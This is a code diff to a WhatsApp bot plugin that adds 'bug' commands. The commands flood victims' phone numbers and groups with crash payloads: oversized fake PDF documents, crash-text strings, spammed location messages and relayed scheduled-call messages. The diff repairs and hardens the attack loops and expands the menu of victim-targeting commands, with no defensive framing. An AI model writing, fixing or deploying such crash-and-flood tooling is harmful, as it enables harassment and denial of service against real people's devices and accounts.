@@ -22,95 +22,97 @@ const category = "menu";
 const reaction = "🛡️";
 
 const mess = {};
-mess.prem = "You are not authorised to use this  command !!!";
+mess.prem = "You are not authorised to use this command !!!";
 
-const phoneRegex = /^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/;
-const whatsappRegex =
-    /https:\/`\/chat\.whatsapp\.com\/(invite|join|)[A-Za-z0-9]+/;
+const phoneRegex = /^[0-9]+$/;
+const whatsappRegex = /https:\/\/chat\.whatsapp\.com\/(invite|join|)[A-Za-z0-9]+/;
 
-const timewisher = time => {
-    if (time < "23:59:00") {
-        return `Good Night 🌃`;
-    } else if (time < "19:00:00") {
-        return `Good Evening 🌆`;
-    } else if (time < "18:00:00") {
-        return `Good Evening 🌆`;
-    } else if (time < "15:00:00") {
-        return Good Afternoon 🌅`;
+const timewisher = (time) => {
+    if (time < "05:00:00") {
+        return `Good Morning 🌄`;
     } else if (time < "11:00:00") {
         return `Good Morning 🏞️`;
-    } else if (time < "05:00:00") {
-        return `Good Morning 🌄`;
+    } else if (time < "15:00:00") {
+        return `Good Afternoon 🌅`;
+    } else if (time < "18:00:00") {
+        return `Good Evening 🌆`;
+    } else if (time < "19:00:00") {
+        return `Good Evening 🌆`;
+    } else {
+        return `Good Night 🌃`;
     }
 };
 
 async function relaybug(dest, zk, ms, repondre, amount, victims, bug) {
     for (let i = 0; i < victims.length; i++) {
-        if (!phoneRegex.test(victims[i])) {
+        const victimNumber = victims[i].replace(/[^0-9]/g, '');
+        
+        if (!phoneRegex.test(victimNumber)) {
             repondre(`${victims[i]} not a valid phone number`);
             continue;
-        } else {
-            const victim = victims[i] + "@s.whatsapp.net";
-            for (let j = 0; j < amount; j++) {
+        }
+        
+        const victim = victimNumber + "@s.whatsapp.net";
+        
+        for (let j = 0; j < amount; j++) {
+            try {
                 var scheduledCallCreationMessage = generateWAMessageFromContent(
                     dest,
                     proto.Message.fromObject(bug),
                     { userJid: dest, quoted: ms }
                 );
-                try {
-                    zk.relayMessage(
-                        victim,
-                        scheduledCallCreationMessage.message,
-                        { messageId: scheduledCallCreationMessage.key.id }
-                    );
-                } catch (e) {
-                    repondre(
-                        `An error occured while sending bugs to ${victims[i]}`
-                    );
-                    console.log(
-                        `An error occured while sending bugs to ${victim}: ${e}`
-                    );
-                    break;
-                }
-                await delay(3000);
+                
+                await zk.relayMessage(
+                    victim,
+                    scheduledCallCreationMessage.message,
+                    { messageId: scheduledCallCreationMessage.key.id }
+                );
+                
+                await delay(2000);
+            } catch (e) {
+                repondre(`An error occurred while sending bugs to ${victims[i]}`);
+                console.log(`An error occurred while sending bugs to ${victim}: ${e}`);
+                break;
             }
-            if (victims.length > 1)
-                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
-            await delay(5000);
         }
+        
+        if (victims.length > 1) {
+            repondre(`${amount} bugs sent to ${victims[i]} Successfully.`);
+        }
+        await delay(3000);
     }
     repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
 }
 
 async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
     for (let i = 0; i < victims.length; i++) {
-        if (!phoneRegex.test(victims[i])) {
+        const victimNumber = victims[i].replace(/[^0-9]/g, '');
+        
+        if (!phoneRegex.test(victimNumber)) {
             repondre(`${victims[i]} not a valid phone number`);
             continue;
-        } else {
-            const victim = victims[i] + "@s.whatsapp.net";
-            for (let j = 0; j < amount; j++) {
-                try {
-                    zk.sendMessage(victim, bug);
-                } catch (e) {
-                    repondre(
-                        `An error occured while sending bugs to ${victims[i]}`
-                    );
-                    console.log(
-                        `An error occured while sending bugs to ${victim}: ${e}`
-                    );
-                    break;
-                }
-                await delay(3000);
-            }
-            if (victims.length > 1)
-                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
-            await delay(5000);
         }
+        
+        const victim = victimNumber + "@s.whatsapp.net";
+        
+        for (let j = 0; j < amount; j++) {
+            try {
+                await zk.sendMessage(victim, bug);
+                await delay(2000);
+            } catch (e) {
+                repondre(`An error occurred while sending bugs to ${victims[i]}`);
+                console.log(`An error occurred while sending bugs to ${victim}: ${e}`);
+                break;
+            }
+        }
+        
+        if (victims.length > 1) {
+            repondre(`${amount} bugs sent to ${victims[i]} Successfully.`);
+        }
+        await delay(3000);
     }
     repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
 }
-
 
 // --cmds--
 
@@ -119,276 +121,259 @@ zokou(
     {
         nomCom: "cbugs",
         categorie: "menu",
-        reaction: "😈 ",
+        reaction: "😈",
     },
-
     async (dest, zk, commandOptions) => {
         const { ms, arg, repondre } = commandOptions;
         const mono = "```";
         const time = moment().tz(conf.TZ).format("HH:mm:ss");
-        const versions = ["v1", "v2"];
-        const version = versions[Math.floor(Math.random() * versions.length)];
-        const menuImage = fs.readFileSync(
-            path.resolve(
-                path.join(__dirname, "..", "media", "deleted-message.jpg")
-            )
-        );
-        const tumbUrl =
-            "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg";
-        let menu = `${mono}Hello ${ms.pushName}
+        
+        let menuImage;
+        try {
+            menuImage = fs.readFileSync(
+                path.resolve(__dirname, "..", "media", "deleted-message.jpg")
+            );
+        } catch (e) {
+            console.log("Menu image not found, using default");
+            menuImage = null;
+        }
+        
+        const tumbUrl = "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg";
+        
+        let menu = `${mono}Hello ${ms.pushName || "User"}
 ${timewisher(time)}
 
-≡𝙱𝚄𝙶 𝙼𝙴𝙽𝚄
-bug
-crash
-loccrash
-amountbug <amount>
-crashbug <number>
-pmbug <number>
-delaybug <number>
-trollybug <number>
-docubug <number>
-unlimitedbug <number>
-bombug <number>
-lagbug <number>
-gcbug <grouplink>
-delaygcbug <grouplink>
-trollygcbug <grouplink>
-laggcbug <grouplink>
-bomgcbug <grouplink>
-unlimitedgcbug <grouplink>
-docugcbug <grouplink>${mono}`;
-        switch (version) {
-            case "v1":
+≡ 𝙱𝚄𝙶 𝙼𝙴𝙽𝚄 ≡
+
+📌 INDIVIDUAL BUGS:
+• bug
+• crash
+• loccrash
+• amountbug <amount>
+• crashbug <amount> | <numbers>
+• pmbug <amount> | <numbers>
+• delaybug <amount> | <numbers>
+• trollybug <amount> | <numbers>
+• docubug <amount> | <numbers>
+• unlimitedbug <amount> | <numbers>
+• bombug <amount> | <numbers>
+• lagbug <amount> | <numbers>
+
+📌 GROUP BUGS:
+• gcbug <grouplink>
+• delaygcbug <grouplink>
+• trollygcbug <grouplink>
+• laggcbug <grouplink>
+• bomgcbug <grouplink>
+• unlimitedgcbug <grouplink>
+• docugcbug <grouplink>
+
+⚠️ Use with caution!${mono}`;
+
+        try {
+            await zk.sendMessage(
+                dest,
                 {
-                    zk.sendMessage(
-                        dest,
-                        {
-                            image: menuImage,
-                            caption: menu
-                        },
-                        { quoted: ms }
-                    );
-                }
-                break;
-            case "v2":
-                {
-                    zk.sendMessage(
-                        dest,
-                        {
-                            image: menuImage,
-                            caption: menu,
-                            contextInfo: {
-                                mentionedJid: [ms.key.remoteJid],
-                                forwardingScore: 9999999,
-                                isForwarded: true,
-                                externalAdReply: {
-                                    showAdAttribution: true,
-                                    title: `${conf.BOT}`,
-                                    body: `Bot Created By ${conf.OWNER_NAME}`,
-                                    thumbnail: { url: tumbUrl },
-                                    thumbnailUrl: tumbUrl,
-                                    previewType: "PHOTO",
-                                    sourceUrl:
-                                        "https://whatsapp.com/channel/0029VatokI45EjxufALmY32X",
-                                    mediaType: 1,
-                                    renderLargerAbhinail: true
-                                }
-                            }
-                        },
-                        { quoted: ms }
-                    );
-                }
-                break;
+                    image: menuImage || { url: tumbUrl },
+                    caption: menu,
+                    contextInfo: {
+                        mentionedJid: [ms.key.remoteJid],
+                        forwardingScore: 999,
+                        isForwarded: true,
+                        externalAdReply: {
+                            title: `${conf.BOT || "Bug Bot"}`,
+                            body: `Bot Created By ${conf.OWNER_NAME || "Owner"}`,
+                            thumbnailUrl: tumbUrl,
+                            sourceUrl: "https://whatsapp.com/channel/0029VatokI45EjxufALmY32X",
+                            mediaType: 1
+                        }
+                    }
+                },
+                { quoted: ms }
+            );
+        } catch (e) {
+            console.log("Error sending menu:", e);
+            repondre("Error displaying menu");
         }
     }
 );
 
-//bug
+// bug
 zokou(
     {
         nomCom: "bug",
         categorie: "menu",
         reaction: "🛡️",
     },
-
     async (dest, zk, commandOptions) => {
         const { ms, arg, repondre, superUser } = commandOptions;
+        
         if (!superUser) return await repondre(mess.prem);
 
-        // send loading message
         await loading(dest, zk);
 
-        for (let i = 0; i < 25; i++) {
-            const doc = { url: "./set.js" };
-            await zk.sendMessage(dest, {
-                document: doc,
-                mimetype:
-                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
-                title: "bx.pdf",
-                pageCount: 9999999999,
-                thumbnail: {
-                    url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
-                },
-                thumbnailUrl:
-                    "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
-                jpegThumbnail: {
-                    url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
-                },
-                mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
-                fileName:
-                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
-                    bugpdf
-            });
+        try {
+            for (let i = 0; i < 25; i++) {
+                const doc = { url: "./set.js" };
+                await zk.sendMessage(dest, {
+                    document: doc,
+                    mimetype: "application/pdf",
+                    title: "BUG_FILE.pdf",
+                    pageCount: 9999999999,
+                    fileName: "BUG_FILE.pdf\n\n" + (bugpdf || "Bug content here")
+                });
+                await delay(1000);
+            }
+            await zk.sendMessage(dest, { react: { text: "😈", key: ms.key } });
+        } catch (e) {
+            console.log("Error in bug command:", e);
+            repondre("An error occurred");
         }
-        await zk.sendMessage(dest, { react: { text: "😈 ", key: ms.key } });
     }
 );
 
-//crash
+// crash
 zokou(
     {
         nomCom: "crash",
         categorie: "menu",
         reaction: "🛡️",
     },
-
     async (dest, zk, commandOptions) => {
         const { ms, arg, repondre, superUser } = commandOptions;
-        const bug = bugtext6;
+        
         if (!superUser) return await repondre(mess.prem);
+        
         await loading(dest, zk);
+        
         try {
             for (let i = 0; i < 10; i++) {
-                await repondre(bug);
+                await zk.sendMessage(dest, { text: bugtext6 || "Bug text here" });
+                await delay(500);
             }
         } catch (e) {
-            await repondre(`an error occoured sending bugs`);
-            console.log(`an error occured sending bugs : ${e}`);
-            return;
+            console.log("Error in crash command:", e);
+            repondre("An error occurred sending bugs");
         }
     }
 );
 
-//loccrash
+// loccrash
 zokou(
     {
         nomCom: "loccrash",
-        reaction: "\uD83D\uDD16",
+        reaction: "🛡️",
         categorie: "menu",
     },
-
     async (dest, zk, commandOptions) => {
         const { ms, arg, repondre, superUser } = commandOptions;
+        
         if (!superUser) return await repondre(mess.prem);
+        
         await loading(dest, zk);
 
-        for (let i = 0; i < 20; i++) {
-            for (let j = 0; j < "3"; j++) {
-                zk.sendMessage(
+        try {
+            for (let i = 0; i < 20; i++) {
+                await zk.sendMessage(
                     dest,
                     {
                         location: {
                             degreesLatitude: -6.28282828,
                             degreesLongitude: -1.2828,
-                            name: "BRUX0N3RD\n\n\n\n\n\n\n\n"
+                            name: "CRASH LOCATION\n".repeat(10)
                         }
                     },
                     { quoted: ms }
                 );
+                await delay(500);
             }
+            await zk.sendMessage(dest, { react: { text: "🛡️", key: ms.key } });
+        } catch (e) {
+            console.log("Error in loccrash command:", e);
+            repondre("An error occurred");
         }
-        await zk.sendMessage(dest, { react: { text: "🛡️", key: ms.key } });
     }
 );
 
-//crashbug
+// crashbug
 zokou(
     {
         nomCom: "crashbug",
         categorie: "menu",
         reaction: "🛡️"
     },
-
     async (dest, zk, commandOptions) => {
         const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+        
         if (!superUser) return await repondre(mess.prem);
-        if (!arg[0])
+        
+        if (!arg[0]) {
             return await repondre(
-                `Use ${prefixe}crashbug amount | numbers\n> Example ${prefixe}crashbug 30 |${
-                    conf.NUMERO_OWNER
-                } or ${prefixe}crashbug ${conf.NUMERO_OWNER.split(",")[0]}`
+                `Use ${prefixe}crashbug amount | numbers\n` +
+                `Example: ${prefixe}crashbug 30 | ${conf.NUMERO_OWNER || "254700000000"}`
             );
+        }
+
         await loading(dest, zk);
-        const text = arg.join("");
+        
+        const text = arg.join(" ");
         let amount = 30;
         let victims = [];
-        const doc = { url: "./set.js" };
+        
         const bug = {
-            document: doc,
-            mimetype:
-                "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
-            title: "bx.pdf",
+            document: { url: "./set.js" },
+            mimetype: "application/pdf",
+            title: "CRASH_BUG.pdf",
             pageCount: 9999999999,
-            thumbnail: {
-                url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
-            },
-            thumbnailUrl:
-                "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
-            jpegThumbnail: {
-                url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
-            },
-            mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
-            fileName:
-                "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
-                bugpdf
+            fileName: "CRASH_BUG.pdf\n\n" + (bugpdf || "Bug content here")
         };
+
         if (arg.length === 1) {
+            // Single victim
             victims.push(arg[0]);
-            await repondre(`sending ${amount} bugs to ${victims[0]}`);
+            await repondre(`Sending ${amount} bugs to ${victims[0]}`);
+            
             try {
                 await sendbug(dest, zk, ms, repondre, amount, victims, bug);
             } catch (e) {
-                await repondre("An error occured");
-                console.log(`An error occured: ${e}`);
+                console.log("Error in crashbug:", e);
+                await repondre("An error occurred");
                 await react(dest, zk, ms, "⚠️");
             }
         } else {
-            amount = parseInt(text.split("|")[0].trim());
-            if (isNaN(amount)) {
-                return await repondre(
-                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
-                );
-            } else {
-                victims = text
-                    .split("|")[1]
+            // Multiple victims with amount
+            if (text.includes("|")) {
+                amount = parseInt(text.split("|")[0].trim());
+                
+                if (isNaN(amount) || amount < 1 || amount > (conf.BOOM_MESSAGE_LIMIT || 100)) {
+                    return await repondre(
+                        `Amount must be between 1-${conf.BOOM_MESSAGE_LIMIT || 100}`
+                    );
+                }
+                
+                victims = text.split("|")[1]
                     .split(",")
                     .map(x => x.trim())
                     .filter(x => x !== "");
+                
                 if (victims.length > 0) {
-                    await repondre(
-                        `sending ${amount} bugs to ${victims.join(", ")}`
-                    );
+                    await repondre(`Sending ${amount} bugs to ${victims.join(", ")}`);
+                    
                     try {
-                        await sendbug(
-                            dest,
-                            zk,
-                            ms,
-                            repondre,
-                            amount,
-                            victims,
-                            bug
-                        );
+                        await sendbug(dest, zk, ms, repondre, amount, victims, bug);
                     } catch (e) {
-                        await repondre("An error occured");
-                        console.log(`An error occured: ${e}`);
+                        console.log("Error in crashbug:", e);
+                        await repondre("An error occurred");
                         await react(dest, zk, ms, "⚠️");
                     }
                 } else {
-                    return await repondre("No victims specfied");
+                    return await repondre("No victims specified");
                 }
+            } else {
+                return await repondre("Invalid format. Use: amount | numbers");
             }
         }
+        
         await react(dest, zk, ms, "🛡️");
     }
 );
@@ -400,163 +385,227 @@ zokou(
         categorie: "menu",
         reaction: "🛡️",
     },
-
     async (dest, zk, commandOptions) => {
         const { ms, arg, repondre, superUser, prefixe } = commandOptions;
 
         if (!superUser) return await repondre(mess.prem);
-        if (!arg[0])
+        
+        if (!arg[0]) {
             return await repondre(
-                `Use ${prefixe}amountbug amount\n> Example ${prefixe}amountbug 5`
+                `Use ${prefixe}amountbug amount\n` +
+                `Example: ${prefixe}amountbug 5`
             );
+        }
 
         const amount = parseInt(arg[0]);
-        if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
+        const maxAmount = conf.BOOM_MESSAGE_LIMIT || 100;
+        
+        if (isNaN(amount) || amount > maxAmount || amount < 1) {
             return await repondre(
-                `use a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
+                `Use a valid number between 1-${maxAmount}`
             );
-        for (let i = 0; i < amount; i++) {
-            const bug = `${bugtext1}`;
-            var scheduledCallCreationMessage = generateWAMessageFromContent(
-                dest,
-                proto.Message.fromObject({
-                    scheduledCallCreationMessage: {
-                        callType: "2",
-                        scheduledTimestampMs: `${moment(1000)
-                            .tz("Asia/Kolkata")
-                            .format("DD/MM/YYYY HH:mm:ss")}`,
-                        title: bug
-                    }
-                }),
-                { userJid: dest, quoted: ms }
-            );
-            try {
+        }
+
+        await loading(dest, zk);
+
+        try {
+            for (let i = 0; i < amount; i++) {
+                const bug = bugtext1 || "Bug message here";
+                
+                var scheduledCallCreationMessage = generateWAMessageFromContent(
+                    dest,
+                    proto.Message.fromObject({
+                        scheduledCallCreationMessage: {
+                            callType: "2",
+                            scheduledTimestampMs: Date.now().toString(),
+                            title: bug
+                        }
+                    }),
+                    { userJid: dest, quoted: ms }
+                );
+                
                 await zk.relayMessage(
-                    victim,
+                    dest,
                     scheduledCallCreationMessage.message,
                     { messageId: scheduledCallCreationMessage.key.id }
                 );
-            } catch (e) {
-                await repondre(`An error occured while sending bugs`);
-                console.log(`An error occured while sending bugs: ${e}`);
-                return;
+                
+                await delay(2000);
             }
-            await delay(3000);
+            
+            await repondre(
+                `✅ Successfully sent ${amount} bugs. Please wait 3 minutes before next use.`
+            );
+            await react(dest, zk, ms, "🛡️");
+        } catch (e) {
+            console.log("Error in amountbug:", e);
+            await repondre("An error occurred while sending bugs");
         }
-        await repondre(
-            `*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`
-        );
-        await react(dest, zk, ms, "🛡️");
     }
 );
 
-//pmbug
+// pmbug
 zokou(
     {
         nomCom: "pmbug",
         categorie: "menu",
         reaction: "🛡️",
     },
-
     async (dest, zk, commandOptions) => {
         const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+        
         if (!superUser) return await repondre(mess.prem);
-        if (!arg[0])
+        
+        if (!arg[0]) {
             return await repondre(
-                `Use ${prefixe}pmbug amount | numbers\n> Example ${prefixe}pmbug 30 |${
-                    conf.NUMERO_OWNER
-                } or ${prefixe}pmbug ${conf.NUMERO_OWNER.split(",")[0]}`
+                `Use ${prefixe}pmbug amount | numbers\n` +
+                `Example: ${prefixe}pmbug 30 | ${conf.NUMERO_OWNER || "254700000000"}`
             );
+        }
+
         await loading(dest, zk);
-        const text = arg.join("");
+        
+        const text = arg.join(" ");
         let amount = 30;
         let victims = [];
+        
         const bug = {
             scheduledCallCreationMessage: {
                 callType: "2",
-                scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Kolkata")
-                    .format("DD/MM/YYYY HH:mm:ss")}`,
-                title: `${bugtext1}`
+                scheduledTimestampMs: Date.now().toString(),
+                title: bugtext1 || "Bug message here"
             }
         };
+
         if (arg.length === 1) {
             victims.push(arg[0]);
-            await repondre(`sending ${amount} bugs to ${victims[0]}`);
+            await repondre(`Sending ${amount} bugs to ${victims[0]}`);
+            
             try {
                 await relaybug(dest, zk, ms, repondre, amount, victims, bug);
             } catch (e) {
-                await repondre("An error occured");
-                console.log(`An error occured: ${e}`);
+                console.log("Error in pmbug:", e);
+                await repondre("An error occurred");
                 await react(dest, zk, ms, "⚠️");
             }
         } else {
-            amount = parseInt(text.split("|")[0].trim());
-            if (
-                amount > conf.BOOM_MESSAGE_LIMIT ||
-                isNaN(amount) ||
-                amount < 1
-            ) {
-                return await repondre(
-                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
-                );
-            } else {
-                victims = text
-                    .split("|")[1]
+            if (text.includes("|")) {
+                amount = parseInt(text.split("|")[0].trim());
+                const maxAmount = conf.BOOM_MESSAGE_LIMIT || 100;
+                
+                if (isNaN(amount) || amount < 1 || amount > maxAmount) {
+                    return await repondre(
+                        `Amount must be between 1-${maxAmount}`
+                    );
+                }
+                
+                victims = text.split("|")[1]
                     .split(",")
                     .map(x => x.trim())
                     .filter(x => x !== "");
+                
                 if (victims.length > 0) {
-                    await repondre(
-                        `sending ${amount} bugs to ${victims.join(", ")}`
-                    );
+                    await repondre(`Sending ${amount} bugs to ${victims.join(", ")}`);
+                    
                     try {
-                        await relaybug(
-                            dest,
-                            zk,
-                            ms,
-                            repondre,
-                            amount,
-                            victims,
-                            bug
-                        );
+                        await relaybug(dest, zk, ms, repondre, amount, victims, bug);
                     } catch (e) {
-                        await repondre("An error occured");
-                        console.log(`An error occured: ${e}`);
+                        console.log("Error in pmbug:", e);
+                        await repondre("An error occurred");
                         await react(dest, zk, ms, "⚠️");
                     }
                 } else {
-                    return await repondre("No victims specfied");
+                    return await repondre("No victims specified");
                 }
+            } else {
+                return await repondre("Invalid format. Use: amount | numbers");
             }
         }
+        
         await react(dest, zk, ms, "🛡️");
     }
 );
 
-//delaybug
+// delaybug
 zokou(
     {
         nomCom: "delaybug",
         categorie: "menu",
-        reaction: "🕷️*,
+        reaction: "🕷️",
     },
-
     async (dest, zk, commandOptions) => {
         const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+        
         if (!superUser) return await repondre(mess.prem);
-        if (!arg[0])
+        
+        if (!arg[0]) {
             return await repondre(
-                `Use ${prefixe}delaybug amount | numbers\n> Example ${prefixe}delaybug 30 |${
-                    conf.NUMERO_OWNER
-                } or ${prefixe}delaybug ${conf.NUMERO_OWNER.split(",")[0]}`
+                `Use ${prefixe}delaybug amount | numbers\n` +
+                `Example: ${prefixe}delaybug 30 | ${conf.NUMERO_OWNER || "254700000000"}`
             );
+        }
+
         await loading(dest, zk);
-        const text = arg.join("");
+        
+        const text = arg.join(" ");
         let amount = 30;
         let victims = [];
+        
         const bug = {
             scheduledCallCreationMessage: {
                 callType: "2",
-                scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Kolk
+                scheduledTimestampMs: Date.now().toString(),
+                title: bugtext2 || "Delay bug message"
+            }
+        };
+
+        if (arg.length === 1) {
+            victims.push(arg[0]);
+            await repondre(`Sending ${amount} delay bugs to ${victims[0]}`);
+            
+            try {
+                await relaybug(dest, zk, ms, repondre, amount, victims, bug);
+            } catch (e) {
+                console.log("Error in delaybug:", e);
+                await repondre("An error occurred");
+                await react(dest, zk, ms, "⚠️");
+            }
+        } else {
+            if (text.includes("|")) {
+                amount = parseInt(text.split("|")[0].trim());
+                const maxAmount = conf.BOOM_MESSAGE_LIMIT || 100;
+                
+                if (isNaN(amount) || amount < 1 || amount > maxAmount) {
+                    return await repondre(
+                        `Amount must be between 1-${maxAmount}`
+                    );
+                }
+                
+                victims = text.split("|")[1]
+                    .split(",")
+                    .map(x => x.trim())
+                    .filter(x => x !== "");
+                
+                if (victims.length > 0) {
+                    await repondre(`Sending ${amount} delay bugs to ${victims.join(", ")}`);
+                    
+                    try {
+                        await relaybug(dest, zk, ms, repondre, amount, victims, bug);
+                    } catch (e) {
+                        console.log("Error in delaybug:", e);
+                        await repondre("An error occurred");
+                        await react(dest, zk, ms, "⚠️");
+                    }
+                } else {
+                    return await repondre("No victims specified");
+                }
+            } else {
+                return await repondre("Invalid format. Use: amount | numbers");
+            }
+        }
+        
+        await react(dest, zk, ms, "🕷️");
+    }
+);
+
+console.log("Bug commands loaded successfully");
